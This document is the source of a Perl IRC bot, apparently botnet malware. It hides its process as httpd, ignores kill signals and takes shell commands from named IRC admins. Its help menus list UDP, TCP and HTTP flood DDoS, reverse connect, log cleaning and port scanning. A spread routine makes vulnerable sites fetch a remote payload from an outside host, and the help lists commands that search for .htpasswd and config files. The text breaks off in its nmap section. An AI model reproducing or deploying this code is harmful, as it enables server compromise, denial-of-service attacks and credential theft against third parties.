# %.%.%.%.%.%.%.%.%.%.%.%.%.%.%.%
# % cHApoenk XtReme scanner Bot  %
# %.%.%.%.%.%.%.%.%.%.%.%.%.%.%.%
#################################

######################
use HTTP::Request;
use LWP::UserAgent;
######################
my $processo = '/usr/sbin/httpd';
######################
#####################################################################
#/!\                          .:CONFIGURATION:.                  /!\#
#####################################################################
############################################
my $linas_max='8';
#-----------------                         #
# Maximum Lines for Anti Flood             #
#############################################
my $sleep='5';
#-----------------                         #                                      
#Sleep Time                                #
############################################
my $cmd="http://www.headwatersinc.org/newsroom/images/billgate.txt??";
#-----------------                         #
#CMD that is printed in the channel        #
############################################
my $id="http://www.ads.dynahoo.com/images/test.txt?";
#-----------------                         #
#ID = Response CMD                         #
############################################
my $spread="http://www.ads.dynahoo.com/images/er.txt";
#-----------------                         #
#Spreader                                  #
############################################
my @adms=("billgate");
#my @hostauth=("1980");
#-----------------                         #
#Admins of the Bot set your nickname here  #
############################################
my @canais=("#indohackerlink");
#-----------------                         #
#Put your channel here                     #
############################################
my @nickname = ("Abdulrazak","Ackerman","Adams","Addison","Adelstein","Adibe","Adorno","Ahlers","Alavi","Alcorn","Alda", "Aleks","Allison","Alongi","Altavilla","Altenberger","Altenhofen","Amaral","Amatangelo","Ameer","Amsden","Anand","Andel", "Ando","Andrelus","Andron","Anfinrud","Ansley","Anthony","Antos","Arbia","Arduini","Arellano","Aristotle","Arjas","Arky","Atkins", "Augustus","Aurelius","Axelrod","Axworthy","Ayiemba","Aykroyd","Ayling","Azima","Bachmuth","Backus","Bady","Baglivo","Bagnold", "Bailar","Bakanowsky","Baleja","Ballatori","Ballew","Baltz","Banta","Barabesi","Barajas","Baranczak","Baranowska","Barberi","Barbetti", "Barneson","Barnett","Barriola","Barry","Bartholomew","Bartolome","Bartoo","Basavappa","Bashevis","Batchelder","Baumiller","Bayles","Bayo", "Beacon","Beal","Bean","Beckman","Beder","Bedford","Behenna","Belanger","Belaoussof","Belfer","Belin-Collart","Bellavance","Bellhouse", "Bellini","Belloc","Benedict-Dye","Bergson","Berke-Jenkins","Bernardo", "Bernassola","Bernston","Berrizbeitia","Betti","Beynart","Biagioli", "Bickel","Binion","Bir","Bisema","Bisho","Blackbourn","Blackwell","Blagg","Blakemore","Blanke","Bliss","Blizard","Bloch","Bloembergen", "Bloemhof","Bloxham","Blyth","Bolger","Bolick","Bollinger","Bologna","Boner","Bonham","Boniface","Bontempo","Book","Bookbinder","Boone", "Boorstin","Borack","Borden","Bossi","Bothman","Botosh","Boudin","Boudrot","Bourneuf","Bowers","Boxer","Boyajian","Boyes","Boyland", "Boym", "Boyne","Bracalente","Bradac","Bradach","Brecht","Breed","Brenan","Brennan","Brewer","Brewer","Bridgeman","Bridges","Brinton", "Britz","Broca","Brook","Brzycki","Buchan","Budding","Bullard","Bunton","Burden","Burdzy","Burke","Burridge","Busetta","Byatt","Byerly", "Byrd","Cage","Calnan","Cammelli","Cammilleri","Canley","Capanni","Caperton","Capocaccia","Capodilupo","Cappuccio","Capursi","Caratozzolo", "Carayannopoulos","Carlin","Carlos","Carlyle","Carmichael","Caroti","Carper","Cartmill","Cascio","Case","Caspar","Castelda","Cavanagh", "Cavell","Ceniceros","Cerioli","Chapman","Charles","Cheang","Cherry","Chervinsky","Chiassino","Chien","Childress","Childs","Chinipardaz", "Chinman","Christenson","Christian","Christiano","Christie","Christopher","Chu","Chupasko","Church","Ciampaglia","Cicero","Cifarelli", "Claffey","Clancy","Clark","Clement","Clifton","Clow","Coblenz","Coito","Coldren","Colella","Collard","Collis","Compton","Compton", "Comstock","Concino","Condodina","Connors","Corey","Cornish","Cosmides","Counter","Coutaux","Crawford","Crocker","Croshaw","Croxen", "Croxton","Cui","Currier","Cutler","Cvek","Cyders","daSilva","Daldalian","Daly","D'Ambra","Danieli","Dante","Dapice","D'arcangelo","Das", "Dasgupta","Daskalu","David","Dawkins","DeGennaro","DeLaPena","del'Enclos","deRousse","Debroff","Dees","Defeciani","Delattre","Deleon-Rendon", "Delger","Dell'acqua","Deming","Dempster","Demusz","Denault","Denham","Denison","Desombre","Deutsch","D'fini","Dicks","Diefenbach","Difabio", "Difronzo","Dilworth","Dionysius","Dirksen","Dockery","Doherty","Donahue","Donner","Doonan","Dore","Dorf","Dosi","Doty","Doug","Dowsland", "Drinker","D'souza","Duffin","Durrett","Dussault","Dwyer","Eardley","Ebeling","Eckel","Edley","Edner","Edward","Eickenhorst","Eliasson", "Elmendorf","Elmerick","Elvis","Encinas","Enyeart","Eppling","Erbach","Erdman","Erdos","Erez","Espinoza","Estes","Etter","Euripides", "Everett","Fabbris","Fagan","Faioes","Falco-Acosta","Falorsi","Faris","Farone","Farren","Fasso'","Fates","Feigenbaum","Fejzo","Feldman", "Fernald","Fernandes","Ferrante","Ferriell","Feuer","Fido","Field","Fink","Finkelstein","Finnegan","Fiorina","Fisk","Fitzmaurice","Flier", "Flores","Folks","Forester","Fortes","Fortier","Fossey","Fossi","Francisco","Franklin-Kenea","Franz","Frazier-Davis","Freid","Freundlich", "Fried","Friedland","Frisken","Frowiss","Fryberger","Frye","Fujii-Abe","Fuller","Furth","Fusaro","Gabrielli","Gaggiotti","Galeotti","Galwey", "Gambini","Garfield","Garman","Garonna","Geller","Gemberling","Georgi","Gerrett","Ghorai","Gibbens","Gibson","Gilbert","Gili","Gill","Gillispie", "Gist","Gleason","Glegg","Glendon","Goldfarb","Goncalves","Good","Goodearl","Goody","Gozzi","Gravell","Greenberg","Greenfeld","Griffiths", "Grigoletto","Grummell","Gruner","Gruppe","Guenthart","Gunn","Guo","Ha","Haar","Hackman","Hackshaw","Haley","Halkias","Hallowell","Halpert", "Hambarzumjan","Hamer","Hammerness","Hand","Hanssen","Harding","Hargraves","Harlow","Harrigan","Hartman","Hartmann","Hartnett","Harwell", "Haviaras","Hawkes","Hayes","Haynes","Hazlewood","Heermans","Heft","Heiland","Hellman","Hellmiss","Helprin","Hemphill","Henery","Henrichs", "Hernandez","Herrera","Hester","Heubert","Heyeck","Himmelfarb","Hind","Hirst","Hitchcock","Hoang","Hock","Hoffer","Hoffman","Hokanson","Hokoda", "Holmes","Holoien","Holter","Holway","Holzman","Hooker","Hopkins","Horsley","Hoshida","Hostage","Hottle","Howard","Hoy","Huey","Huidekoper", "Hungerford","Huntington","Hupp","Hurtubise","Hutchings","Hyde","Iaquinta","Ichikawa","Igarashi","Inamura","Inniss","Isaac","Isaievych","Isbill", "Isserman","Iyer","Jacenko","Jackson","Jagers","Jagger","Jagoe","Jain","Jamil","Janjigian","Jarnagin","Jarrell","Jay","Jeffers","Jellis", "Jenkins","Jespersen","Jewett","Johannesson","Johannsen","Johns","Jolly","Jorgensen","Jucks","Juliano","Julious","Kabbash","Kaboolian","Kafadar", "Kalbfleisch","Kaligian","Kalil","Kalinowski","Kalman","Kamel","Kangis","Karpouzes","Kassower","Kasten","Kawachi","Kee","Keenan","Keepper", "Keith","Kelker","Kelsey","Kempton","Kemsley","Kendall","Kerry","Keul","Khong","Kimmel","Kimmett","Kimura","Kindall","Kinsley","Kippenberger", "Kirscht","Kittridge","Kleckner","Kleiman","Kleinfelder","Klemperer","Kling","Klinkenborg","Klint","Knuff","Kobrick","Koch","Kohn","Koivumaki", "Kommer","Koniaris","Konrad","Kool","Korzybski","Kotter","Kovaks","Kraemer","Krailo","Krasney","Kraus","Kroemer","Krysiak","Kuenzli","Kumar", "Kusman","Kuwabara","La","Labunka","Lafler","Laing","Lallemant","Landes","Lankes","Lantieri","Lanzit","Laserna","Lashley","Lawless","Lecar", "Lecce","Leclercq","Leite","Lenard","Sofia","Lesser","Lessi","Liakos","Lidano","Liem","Light","Lightfoot","Lim","Linares","Linda","Linder", "Line","Linehan","Linzee","Lippmann","Lipponen","Little","Litvak","Livernash","Livi","Livolsi","Lizardo","Locatelli","Longworth","Loss","Loveman", "Lowenstein","Loza","Lubin","Lucas","Luciano","Luczkow","Luecke","Lunetta","Luoma","Lussier","Lutcavage","Luzader","Ma","Maccormac","Macdonald", "Maceachern","Macintyre","Mackenney","MacMillan","Macy","Madigan","Maggio","Mahony","Maier","Maine-Hershey","Maisano","Malatesta","Maller", "Malova","Manalis","Mandel","Manganiello","Mantovan","March","Marchbanks","Marcus","Margalit","Margetts","Marques","Martinez","Martochio", "Marton","Marubini","Mass","Matalka","Matarazzo","Matsukata","Mattson","Mauzy","May","Mazzali","Mazziotta","Mcbride","Mccaffery","Mccall", "Mcclearn","Mcdowell","Mcelroy","McFadden","Mcghee","Mcgoldrick","McIlroy","Mcintosh","Mcdonald","Mclane","Mclaren","Mcnealy","Mcnulty", "Meccariello","Memisoglu","Menzies","Merikoski","Merlani","Merminod","Merseth","Merz","Metelka","Metropolis","Meurer","Michelman","Middle", "Mieher","Mills","Minh","Mini","Minichiello","Gonzalez","Mitropoulos","Mittal","Mocroft","Modestino","Moeller","Mohr","Moiamedi","Monque","Montilio", "MooreDeCh.","Morani","Moreton","Morrison","Morrow","Mortimer","Mosher","Mosler","Mostafavi","Motooka","Mudarri","Muello","Mugnai","Mulkern", "Mulroy","Mumford","Mussachio","Naddeo","Napolitano","Nardi","Nardone","Naviaux","Nayduch","Nelson","Nenna","Nesci","Neuman","Newfeld","Newlin", "Ng","Ni","Nickerson","Nickoloff","Nisenson","Nitabach","Notman","Nuzum","Ocougne","Ogata","Oh","O'hagan","Oldford","Olsen","Olson","Olszewski", "O'malley","Oman","O'meara","Opel","Oray","Orfield","Orsi","Ospina","Ostrowski","Ottaviani","Otten","Ouchida","Ovid","PaesDealmeida","Paine", "Palayoor","Palepu","Pallara","Palmitesta","Panadero","Panizzon","Pantilla","Paoletti","Parmeggiani","Parris","Partridge","Pascucci","Patefield", "Patrick","Pattullo","Pavetti","Pavlon","Pawloski","Paynter","Peabody","Pearlberg","Pederson","Peishel","Penny","Pereira","Perko","Perlak", "Perlman","Perna","Perone","Perrimon","Peters","Petruzello","Pettibone","Pettit","Pfister","Pilbeam","Pinot","Plancon","Plant","Plasket","Plous", "Po","Pocobene","Poincaire","Pointer","Poirier","Polak","Polanyi","Politis","Poma","Poolman","Powers","Presper","Preucel","Prevost","Pritchard", "Pritz","Proietti","Prothrow-Stith","Puccia","Pugh","Pynchon","Quaday","Quetin","Rabe","Rabkin","Radeke","Rajagopalan","Raney","Rangan","Rankin", "Rapple","Rayport","Redden-Tyler","Reedquist","Cunningham","Reinold","Remak","Renick","Repetto","Resnik","Rhea","Richmond","Rielly","Rindos", "Rineer","Rish","Rivera","Robinson","Rocha","Roesler","Rogers","Ronen","Row","Royal","Ru","Ruan","Ruderman","Ruescher","Rush","Ryu","Sabatello", "Sadler","Safire","Sahu","Sali","Samson","Sanchez-Ramirez","Sanna","Sapers","Sarin","Sartore","Sase","Satin","Satta","Satterthwaite","Sawtell", "Sayied","Scarponi","Scepan","Scharf","Scharlemann","Scheiner","Schiano","Schifini","Schilling","Schmitt","Schossberger","Schuman","Schutte", "Schuyler","Schwan","Schwickrath","Scovel","Scudder","Seaton","Seeber","Segal","Sekler","Selvage","Sen","Sennett","Seterdahl","Sexton", "Seyfert","Shaikh","Shakis","Shankland","Shanley","Shar","Shatrov","Shavelson","Shea","Sheats","Shepherd","Sheppard","Shepstone","Shesko","Shia", "Shibata","Shimon","Siesto","Sigalot","Sigini","Signa","Silverman","Silvetti","Sinsabaugh","Sirilli","Sites","Skane","Skerry","Skoda","Sloan", "Slowe","Smilow","Sniffen","Snodgrass","Socolow","Solon","Somers","Sommariva","Sorabella","Sorg","Sottak","Soukup","Soule","Soultanian","Spanier", "Sparrow","Spaulding","Speizer","Spence","Sperber","Spicer","Spiegelhalter","Spiliotis","Spinrad","StMartin","Stalvey","Stam","Stang","Stassinopolus", "States","Statlender","Stefani","Steiner","Stephanian","Stepniewska","Stewart-Oaten","Stiepock","Stillwell","Stock","Stockton","Stockwell","Stolzenberg", "Stonich","Storer","Stott","Strange","Strauch","Streiff","Stringer","Sullivan","Sumner","Suo","Surdam","Sweeting","Sweetser","Swindle","Tagiuri", "Tai", "Talaugon","Tambiah","Tandler","Tanowitz","Tatar","Taveras","Tawn","Tcherepnin","Teague","Temes","Temmer","Tenney","Terracini","Than", "Thavaneswaran","Theodos","Thibault","Thisted","Thomsen","Throop","Tierney","Till","Timmons","Tofallis","Tollestrup","Tolls","Tolman","Tomford", "Toomer","Topulos","Torresi","Torske","Towler","Toye","Traebert","Trenga","Trewin","Tringali","Troiani","Troy","Truss","Tsiatis","Tsomides","Tsukurov", "Tuck","Tudge","Tukan","Turano","Turek","Tuttle","Twells","Tzamarias","Ullman","Untermeyer","Upsdell","Urban","Urdang-Brown","Usdan","Uzuner", "Vacca","Waite","Valberg","Valencia","Wales","Wallenberg","Walter","vanAllen","VanZwet","Vandenberg","Vanheeckeren","Warshafsky","Wasowska","Vasquez", "Waugh","Weighart","Weingarten","Weinhaus","Weissbourd","Weissman","Velasquez","Welles","Welsh","Wengret","Venne","Verghese","Wescott","Wetzel", "Whately","Whilton","White","Whitla","Whittaker","Viana","Viano","Wiedersheim","Wiener","Viens","Vignola","Wilder","Wilhelm","Wilk","Wilkin","Wilkinson", "Villarreal","Willstatter","Wilson","Vitali","Viviani","Voigt","Wolk","VonHoffman","Woo","Wooden","Woods","Woods-Powell","Vorhaus","Votey","Yacono", "Yamane","Yankee","Yarchuk","Yates","Ybarra","Yedidia");
my $nick = $nickname[rand scalar @nickname];
#-----------------                         #
#Nickname of bot                           #
############################################
my $ircname ='indolinux';
chop (my $realname = '[indohack]');
#-----------------                         #
#IRC name and Realname                     #
############################################
$servidor='irc.ganteng.la' unless $servidor;
my $porta='6667';
#-----------------                         #
#IRCServer and port                        #
############################################
#####################################################################
#/!\                          .:CONFIGURATION:.                  /!\#
#####################################################################
######################
#End of Configuration# 
#                    #
######################
$SIG{'INT'} = 'IGNORE';
$SIG{'HUP'} = 'IGNORE';
$SIG{'TERM'} = 'IGNORE';
$SIG{'CHLD'} = 'IGNORE';
$SIG{'PS'} = 'IGNORE';
use IO::Socket;
use Socket;
use IO::Select;
chdir("/");
# %.%.%.%.%.%.%.%.%.%.%.%.%.%.%.%
# % cHApoenk XtReme scanner Bot  %
# %.%.%.%.%.%.%.%.%.%.%.%.%.%.%.%

#Connect
$servidor="$ARGV[0]" if $ARGV[0];
$0="$processo"."\0"x16;;
my $pid=fork;
exit if $pid;
die "Masalah fork: $!" unless defined($pid);

our %irc_servers;
our %DCC;
my $dcc_sel = new IO::Select->new();
$sel_cliente = IO::Select->new();
sub sendraw {
  if ($#_ == '1') {
    my $socket = $_[0];
    print $socket "$_[1]\n";
    } else {
    print $IRC_cur_socket "$_[0]\n";
  }
}

sub conectar {
  my $meunick = $_[0];
  my $servidor_con = $_[1];
  my $porta_con = $_[2];
  my $IRC_socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$servidor_con",
  PeerPort=>$porta_con) or return(1);
  if (defined($IRC_socket)) {
    $IRC_cur_socket = $IRC_socket;
    $IRC_socket->autoflush(1);
    $sel_cliente->add($IRC_socket);
    $irc_servers{$IRC_cur_socket}{'host'} = "$servidor_con";
    $irc_servers{$IRC_cur_socket}{'porta'} = "$porta_con";
    $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
    $irc_servers{$IRC_cur_socket}{'meuip'} = $IRC_socket->sockhost;
    nick("$meunick");
    sendraw("USER $ircname ".$IRC_socket->sockhost." $servidor_con :$realname");
    sleep 1;
  }
}

my $line_temp;
while( 1 ) {
  while (!(keys(%irc_servers))) { conectar("$nick", "$servidor", "$porta"); }
  delete($irc_servers{''}) if (defined($irc_servers{''}));
  my @ready = $sel_cliente->can_read(0);
  next unless(@ready);
  foreach $fh (@ready) {
    $IRC_cur_socket = $fh;
    $meunick = $irc_servers{$IRC_cur_socket}{'nick'};
    $nread = sysread($fh, $msg, 4096);
    if ($nread == 0) {
      $sel_cliente->remove($fh);
      $fh->close;
      delete($irc_servers{$fh});
    }
    @lines = split (/\n/, $msg);
    for(my $c=0; $c<= $#lines; $c++) {

      $line = $lines[$c];
      $line=$line_temp.$line if ($line_temp);
      $line_temp='';
      $line =~ s/\r$//;
      unless ($c == $#lines) {
        parse("$line");
        } else {
        if ($#lines == 0) {
          parse("$line");
          } elsif ($lines[$c] =~ /\r$/) {
          parse("$line");
          } elsif ($line =~ /^(\S+) NOTICE AUTH :\*\*\*/) {
          parse("$line"); 
          	   } else {
          	               $line_temp = $line;
        }
      }
    }
  }
}

sub parse {
  my $servarg = shift;
  if ($servarg =~ /^PING \:(.*)/) {
    sendraw("PONG :$1");
    } elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) {
    my $pn=$1; my $hostmask= $3; my $onde = $4; my $args = $5;
    if ($args =~ /^\001VERSION\001$/) {
      	 notice("$pn", "\001VERSION mIRC v6.17 ddido\001");
    }
    if (grep {$_ =~ /^\Q$pn\E$/i } @adms ) {
    if ($onde eq "$meunick"){
    shell("$pn", "$args");
  }
  
#End of Connect

# %.%.%.%.%.%.%.%.%.%.%.%.%.%.%.%
# % cHApoenk XtReme scanner Bot  %
# %.%.%.%.%.%.%.%.%.%.%.%.%.%.%.% 
######################
#      PREFIX        #
#                    #
######################
# You can change the prefix if you want but the commands will be different 
# The standard prefix is !bgr if you change it into !bitch for example 
# every command will be like !bitch @udpflood, !bitch @googlescan.
# So its recommended not to change this ;)
######################
  
  if ($args =~ /^(\Q$meunick\E|\!hack)\s+(.*)/ ) {
    my $natrix = $1;
    my $arg = $2;
    if ($arg =~ /^\!(.*)/) {
      ircase("$pn","$onde","$1") unless ($natrix eq "!hack" and $arg =~ /^\!nick/);
      } elsif ($arg =~ /^\@(.*)/) {
      $ondep = $onde;
      $ondep = $pn if $onde eq $meunick;
      bfunc("$ondep","$1");
      } else {
      shell("$onde", "$arg");
    }
  }
}
}
######################
#   End of PREFIX    #
#                    #
######################

elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) {
if (lc($1) eq lc($meunick)) {
  $meunick=$4;
  $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
}
} elsif ($servarg =~ m/^\:(.+?)\s+433/i) {
nick("$meunick".int rand(999999));
} elsif ($servarg =~ m/^\:(.+?)\s+001\s+(\S+)\s/i) {
$meunick = $2;
$irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
$irc_servers{$IRC_cur_socket}{'nome'} = "$1";
foreach my $canal (@canais) {
  sendraw("JOIN $canal ddosit");
}
}
}

sub bfunc {
my $printl = $_[0];
my $funcarg = $_[1];
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
  exit;
} else {

######################
#       Help         # 
#                    #
######################

if ($funcarg =~ /^help/) {
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Help4+) Select the function you want help for");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Help4+) !hack 7@ddos");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Help4+) !hack 7@scanscan");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Help4+) !hack 7@backconnect");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Help4+) !hack 7@shell");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Help4+) !hack 7@portscanner");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Help4+) Or if you want too know all the commands type:");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Help4+) !hack 7@commands");

}

if ($funcarg =~ /^ddos/) {
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Help4+) There are 3 DDossers in this bot");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Help4+) UDPFlood, HTTPFlood and TCPFlood");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Help4+) !hack 7@udpflood <ip> <packet size> <time>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Help4+) !hack 7@tcpflood <ip> <port> <packet size> <time>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Help4+) !hack 7@httpflood <site> <time>");

}

if ($funcarg =~ /^scan/) {
	#sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Help4+) This bot also contains a scan scanner.");
	
}

if ($funcarg =~ /^backconnect/) {
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Help4+) You use backconnect like this :");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Help4+) !hack 7@back <ip><port>");
}

if ($funcarg =~ /^shell/) {
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Help4+) This bot has a integrated shell");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Help4+) You can use it in private but also public in the channel");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Help4+) In public channel just use : 7!bgr cd tmp12 for example");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Help4+) For help with the linux commands type :!hack 7@linuxhelp");
}

if ($funcarg =~ /^port/) {
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Help4+) There is a normal portscan and a Nmap:");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Help4+) !hack 7@portscan <ip>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Help4+) !hack 7@nmap <ip> <beginport> <endport>");
}

if ($funcarg =~ /^commands/) {
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Help4+) You can use the following commands :");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Help4+) !hack 7@portscan <ip>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Help4+) !hack 7@nmap <ip> <beginport> <endport>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Help4+) !hack 7@back <ip><port>");	
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Help4+) !hack cd tmp 12 for example");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Help4+) !hack 7@udpflood <ip> <packet size> <time>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Help4+) !hack 7@tcpflood <ip> <port> <packet size> <time>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Help4+) !hack 7@httpflood <site> <time>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Help4+) !hack 7@linuxhelp");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Help4+) !hack 7@spread <scan>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Help4+) !hack 7@scan <vuln> <dork>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Help4+) !hack 7@system");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Help4+) !hack 7@logcleaner");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Help4+) !hack 7@sendmail <subject> <sender> <recipient> <message>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Help4+) !hack 7@milw0rm");	
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Help4+) !hack 7@join #channel");	
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Help4+) !hack 7@part #channel");
}

if ($funcarg =~ /^linuxhelp/) {
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+LinuxHelp4+) - Dir where you are : pwd");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+LinuxHelp4+) - Start a Perl file : perl file.pl");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+LinuxHelp4+) - Go back from dir : cd ..");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+LinuxHelp4+) - Force to Remove a file/dir : rm -rf file/dir;ls -la");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+LinuxHelp4+) - Show all files/dir with permissions : ls -lia");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+LinuxHelp4+) - Find config.inc.php files : find / -type f -name config.inc.php");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+LinuxHelp4+) - Find all writable folders and files : find / -perm -2 -ls");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+LinuxHelp4+) - Find all .htpasswd files : find / -type f -name .htpasswd");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+LinuxHelp4+) - Find all service.pwd files : find / -type f -name service.pwd");
}

######################
#   End of  Help     # 
#                    #
######################
if ($funcarg =~ /^spread\s+(.*)/) {
$vuln = $1;
sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Spread Mode4+) Spreading bot on :14 $vuln");
my $shellurl="http://".$vuln.$spread."?";
my $reqz=HTTP::Request->new(GET=>$shellurl);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Spread Mode4+) Bot is Spreaded on :14 $vuln"); 
}
######################
#     Commands       # 
#                    #
######################

if ($funcarg =~ /^system/) {
$uname=`uname -a`;$uptime=`uptime`;$ownd=`pwd`;$distro=`cat /etc/issue`;$id=`id`;$un=`uname -sro`;
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+System Info4+) Info BOT : Server : 14Cannot View :14 1337");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+System Info4+) Uname -a     : 7 $uname");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+System Info4+) Uptime       : 7 $uptime");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+System Info4+) Own Prosses  : 7 $processo");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+System Info4+) ID           : 7 $id");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+System Info4+) Own Dir      : 7 $ownd");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+System Info4+) OS           : 7 $distro");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+System Info4+) Owner        : 7 linux");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+System Info4+) Channel      : 7 #indohackerlink");
}

if ($funcarg =~ /^bug/) {
	my @ltt=();
	my @bug=();
	my $x;
	my $page="";
	my $socke = IO::Socket::INET->new(PeerAddr=>"milw0rm.com",PeerPort=>"80",Proto=>"tcp") or return;
	print $socke "GET http://milw0rm.com/rss.php HTTP/1.0\r\nHost: milw0rm.com\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
	my @r = <$socke>;
	$page="@r";
	close($socke);
	while ($page =~  m/<title>(.*)</g){
	$x = $1;
	if ($x =~ /\&lt\;/) {
	$x =~ s/\&lt\;/</g;
	}
	if ($x !~ /milw0rm/) {
	push (@bug,$x);
	}}
	while ($page =~  m/<link.*expl.*([0-9]...)</g) {
	if ($1 !~ m/milw0rm.com|exploits|en/){
	push (@ltt,"http://www.milw0rm.com/exploits/$1 ");
	}}
		sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Milw0rm Hack4+) Latest exploits :");
	foreach $x (0..(@ltt - 1)) {
		sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Milw0rm Hack4+)14 $bug[$x] -3 $ltt[$x]");
	sleep 1;
}}
# %.%.%.%.%.%.%.%.%.%.%.%.%.%.%.%
# % cHApoenk XtReme scanner Bot  %
# %.%.%.%.%.%.%.%.%.%.%.%.%.%.%.%
######################
#      Portscan      # 
#                    #
######################

if ($funcarg =~ /^port (.*)/) {
  my $hostip="$1";
  my
  @portas=("15","19","98","20","21","22","23","25","37","39","42","43","49","53","63","69","79","80","101","106","107","109","110","111","113","115","117","119","135","137","139","143","174","194","389","389","427","443","444","445","464","488","512","513","514","520","540","546","548","565","609","631","636","694","749","750","767","774","783","808","902","988","993","994","995","1005","1025","1033","1066","1079","1080","1109","1433","1434","1512","2049","2105","2432","2583","3128","3306","4321","5000","5222","5223","5269","5555","6660","6661","6662","6663","6665","6666","6667","6668","6669","7000","7001","7741","8000","8018","8080","8200","10000","19150","27374","31310","33133","33733","55555");
  my (@aberta, %porta_banner);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Portscan4+) scanning for open ports on  4".$1." started .");
  foreach my $porta (@portas)  {
    my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $porta, Proto =>
    'tcp', Timeout => 4);
    if ($scansock) {
      push (@aberta, $porta);
      $scansock->close;
    }
  }
  
  if (@aberta) {
    sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Portscan4+) Open ports founded:5 @aberta");
    } else {
    sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Portscan4+) No open ports foundend.");
  }
}

######################
#  End of  Portscan  # 
#                    #
######################
# %.%.%.%.%.%.%.%.%.%.%.%.%.%.%.%
# % cHApoenk XtReme scanner Bot  %
# %.%.%.%.%.%.%.%.%.%.%.%.%.%.%.%
######################
#        Nmap        #  
#                    #
######################
   if ($funcarg =~ /^nmap\s+(.*)\s+(\d+)\s+(\d+)/){
         my $hostip="$1";
         my $portstart = "$2";
         my $portend = "$3";
         my (@abertas, %porta_banner); 
       sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Nmap4+) :4 $1 (4+Port4+) 4 $2-$3");
       foreach my $porta ($portstart..$portend){
               my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $porta, Proto => 'tcp', Timeout => $portime); 
    if ($scansock) {
                 push (@abertas, $porta);
                 $scansock->close;
                 if ($xstats){
        sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Nmap4+) Founded 4 $porta"."/Open"); 
                 }
               }
             }
             if (@abertas) {
        sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Nmap4+) Complete ");
             } else {
        sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Nmap4+) No open ports have been founded 13");
             }
			 }
######################
#    End of Nmap     #  
